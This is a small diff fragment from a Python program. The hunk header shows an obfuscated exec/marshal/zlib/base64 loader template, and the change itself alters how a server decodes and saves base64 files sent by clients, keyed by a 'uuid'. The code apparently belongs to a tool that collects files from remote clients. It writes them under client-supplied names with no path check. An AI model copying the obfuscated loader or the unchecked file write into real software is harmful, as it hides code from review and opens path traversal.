@@ -229,5 +229,5 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             os.makedirs('files_saved')
 
         with open(f"files_saved/{data['uuid']}_{datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')}_{data['file_name']}", 'w') as f:
-            f.write(str(base64.b64decode(data['file'].decode("utf-8"))))
+            f.write(str(base64.b64decode(data['file'])))
 
